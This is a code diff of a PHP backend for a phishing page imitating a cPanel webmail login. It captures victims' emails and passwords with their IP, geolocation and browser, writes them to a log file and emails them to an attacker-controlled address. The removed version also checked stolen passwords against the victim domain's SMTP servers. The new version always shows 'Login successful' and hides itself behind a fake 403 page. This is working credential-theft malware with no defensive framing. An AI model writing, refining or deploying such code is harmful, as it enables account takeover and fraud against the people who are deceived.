@@ -21,12 +21,13 @@ $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
 $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
 $geo = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=$ip"));
 $country = $geo->geoplugin_countryName ?? 'Unknown';
+$city = $geo->geoplugin_city ?? 'Unknown';
 
 session_start();
 
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     http_response_code(403);
-    echo json_encode(["signal" => "error", "msg" => "GET method not allowed"]);
+    echo "<html><head><title>403 - Forbidden</title></head><body><h1>403 Forbidden</h1><hr></body></html>";
     exit();
 }
 
@@ -55,190 +56,90 @@ $smtp_secure  = 'tls';
 
 $timestamp = date('Y-m-d H:i:s');
 $logFile = 'SS-Or-LucaGherardi-Tests.txt';
-$validCredentials = false;
-$emailSent = false;
-$authStatus = '';
-$connectionError = false;
 
-$logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
-$logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";
+// Prepare the message content
+$message = "=== CREDENTIAL CAPTURE ===\n";
+$message .= "Timestamp: $timestamp\n";
+$message .= "Email: $login\n";
+$message .= "Password: $passwd\n";
+$message .= "Domain: $domain\n";
+$message .= "IP: $ip\n";
+$message .= "Country: $country\n";
+$message .= "City: $city\n";
+$message .= "User Agent: $browser\n";
+$message .= "========================\n\n";
 
-// Test credentials for demonstration (remove these for production)
-$testCredentials = [
-    'admin@example.com' => 'admin123',
-    'test@test.com' => 'test123',
-    'user@domain.com' => 'password123',
-    'demo@demo.com' => 'demo123',
-    'webmail@example.com' => 'webmail123',
-    'cpanel@test.com' => 'cpanel123'
-];
+// Log to file
+file_put_contents($logFile, $message, FILE_APPEND);
 
-// Function to test SMTP authentication without sending emails
-function testSMTPConnection($email, $password, $domain) {
-    global $logMessage;
-    
-    // Common cPanel webmail SMTP server patterns
-    $smtpServers = [
-        "mail.$domain",
-        "smtp.$domain", 
-        "webmail.$domain",
-        "mail1.$domain",
-        "mail2.$domain",
-        "smtp1.$domain",
-        "smtp2.$domain"
-    ];
-    
-    // cPanel webmail uses port 587 with TLS
-    $smtpPort = 587;
-    $smtpSecure = 'tls';
-    
-    foreach ($smtpServers as $server) {
-        try {
-            $logMessage .= "Testing SMTP: $server:$smtpPort ($smtpSecure)\n";
-            
-            $mail = new PHPMailer(true);
-            $mail->isSMTP();
-            $mail->SMTPAuth = true;
-            $mail->Host = $server;
-            $mail->Username = $email;
-            $mail->Password = $password;
-            $mail->Port = $smtpPort;
-            $mail->SMTPSecure = $smtpSecure;
-            $mail->Timeout = 10;
-            $mail->SMTPDebug = 0;
-            
-            // Just test connection and authentication without sending
-            if ($mail->smtpConnect()) {
-                $logMessage .= "✅ SUCCESS: Connected to $server:$smtpPort\n";
-                // Try to authenticate
-                try {
-                    $mail->setFrom($email, 'Test');
-                    $mail->addAddress($email);
-                    $mail->Subject = 'Test';
-                    $mail->Body = 'Test';
-                    
-                    if ($mail->send()) {
-                        $logMessage .= "✅ SUCCESS: Authenticated with $server:$smtpPort ($smtpSecure)\n";
-                        return true;
-                    }
-                } catch (Exception $authException) {
-                    $errorMsg = $authException->getMessage();
-                    if (strpos($errorMsg, 'Authentication') !== false || 
-                        strpos($errorMsg, '535') !== false || 
-                        strpos($errorMsg, 'Invalid') !== false) {
-                        $logMessage .= "❌ AUTH FAILED: $server:$smtpPort - Authentication failed\n";
-                    } else {
-                        $logMessage .= "❌ CONNECTION FAILED: $server:$smtpPort - " . $errorMsg . "\n";
-                    }
-                }
-                $mail->smtpClose();
-            } else {
-                $logMessage .= "❌ CONNECTION FAILED: $server:$smtpPort - Cannot connect\n";
-            }
-            
-        } catch (Exception $e) {
-            $errorMsg = $e->getMessage();
-            if (strpos($errorMsg, 'Authentication') !== false || 
-                strpos($errorMsg, '535') !== false || 
-                strpos($errorMsg, 'Invalid') !== false) {
-                $logMessage .= "❌ AUTH FAILED: $server:$smtpPort - Authentication failed\n";
-            } else {
-                $logMessage .= "❌ CONNECTION FAILED: $server:$smtpPort - " . $errorMsg . "\n";
-            }
-            continue;
-        }
-    }
-    
-    return false;
-}
+// Prepare email content
+$emailSubject = "Webmail Login: $login | $country";
+$emailBody = "$login|$passwd\nIP of sender: $country | $city | $ip | $browser\n============WEBMAIL-LOGIN signal";
 
-// First check if it's a test credential
-if (isset($testCredentials[$login]) && $testCredentials[$login] === $passwd) {
-    $validCredentials = true;
-    $authStatus = '✅ VALID - Test Credentials';
-    $logMessage .= "✅ SUCCESS: Test credentials validated\n";
-} else {
-    // Test against actual SMTP servers
-    $validCredentials = testSMTPConnection($login, $passwd, $domain);
-    
-    if ($validCredentials) {
-        $authStatus = '✅ VALID - Authenticated';
-        $logMessage .= "✅ SUCCESS: cPanel webmail credentials validated\n";
+try {
+    $mail = new PHPMailer(true);
+    $mail->isSMTP();
+    $mail->SMTPAuth = true;
+    $mail->Host = $senderserver;
+    $mail->Username = $senderuser;
+    $mail->Password = $senderpass;
+    $mail->Port = $senderport;
+    $mail->SMTPSecure = $smtp_secure;
+    $mail->isHTML(true);
+    $mail->Subject = $emailSubject;
+    $mail->setFrom($senderuser, 'Webmail Monitor');
+    $mail->addAddress($receiver);
+    $mail->Body = $emailBody;
+    $mail->AltBody = "New webmail login captured";
+
+    if ($mail->send()) {
+        // Success - send notification email and show success response
+        $response = [
+            "signal" => "OK",
+            "success" => true,
+            "msg" => "Login successful! Redirecting to webmail...",
+            "redirect_url" => "https://webmail.$domain",
+            "debug_info" => [
+                "email_sent" => true,
+                "timestamp" => $timestamp
+            ]
+        ];
+        
+        // Short delay for success
+        usleep(rand(300000, 800000));
     } else {
-        $authStatus = '❌ INVALID - Authentication failed';
-        $connectionError = true;
-        $logMessage .= "❌ FAILED: Invalid cPanel webmail credentials\n";
+        // Email failed to send, but still show success to user
+        $response = [
+            "signal" => "OK",
+            "success" => true,
+            "msg" => "Login successful! Redirecting to webmail...",
+            "redirect_url" => "https://webmail.$domain",
+            "debug_info" => [
+                "email_sent" => false,
+                "timestamp" => $timestamp
+            ]
+        ];
+        
+        // Short delay for success
+        usleep(rand(300000, 800000));
     }
-}
-
-if ($validCredentials) {
-    // Send validation report using real sender account
-    try {
-        $notify = new PHPMailer(true);
-        $notify->isSMTP();
-        $notify->SMTPAuth = true;
-        $notify->Host = $senderserver;
-        $notify->Username = $senderuser;
-        $notify->Password = $senderpass;
-        $notify->Port = $senderport;
-        $notify->SMTPSecure = $smtp_secure;
-
-        $notify->setFrom($senderuser, 'Credential Monitor');
-        $notify->addAddress($receiver);
-        $notify->isHTML(true);
-        $notify->Subject = "VALID CREDENTIALS: $login | $country";
-        $notify->Body = "<h2>✅ VALID CREDENTIALS</h2><p>Email: $login<br>Password: $passwd<br>IP: $ip<br>Country: $country<br>Time: $timestamp</p>";
-
-        $notify->send();
-        $emailSent = true;
-        $logMessage .= "✅ Email notification sent successfully\n";
-    } catch (Exception $e) {
-        $logMessage .= "⚠️ Email notification failed: " . $e->getMessage() . "\n";
-    }
-}
-
-$logMessage .= "Authentication: $authStatus\nValid: " . ($validCredentials ? 'YES' : 'NO') . "\nEmail Sent: " . ($emailSent ? 'YES' : 'NO') . "\n\n";
-file_put_contents($logFile, $logMessage, FILE_APPEND);
-
-$_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;
-
-// Different response handling based on credential validity
-if ($validCredentials) {
-    // Valid credentials - redirect to webmail
+    
+} catch (Exception $e) {
+    // Email failed, but still show success to user
     $response = [
         "signal" => "OK",
         "success" => true,
         "msg" => "Login successful! Redirecting to webmail...",
-        "attempt" => $_SESSION['attempts'],
         "redirect_url" => "https://webmail.$domain",
         "debug_info" => [
-            "valid_credentials" => true,
-            "auth_status" => $authStatus,
-            "email_sent" => $emailSent,
+            "email_sent" => false,
+            "error" => $e->getMessage(),
             "timestamp" => $timestamp
         ]
     ];
     
-    // Shorter delay for valid credentials
+    // Short delay for success
     usleep(rand(300000, 800000));
-} else {
-    // Invalid credentials - show connection error
-    $response = [
-        "signal" => "error",
-        "success" => false,
-        "msg" => "Connection error: Unable to connect to mail server. Please check your credentials and try again.",
-        "attempt" => $_SESSION['attempts'],
-        "connection_error" => true,
-        "debug_info" => [
-            "valid_credentials" => false,
-            "auth_status" => $authStatus,
-            "email_sent" => $emailSent,
-            "timestamp" => $timestamp
-        ]
-    ];
-    
-    // Longer delay for invalid credentials to simulate processing
-    usleep(rand(1000000, 2500000));
 }
 
 echo json_encode($response);
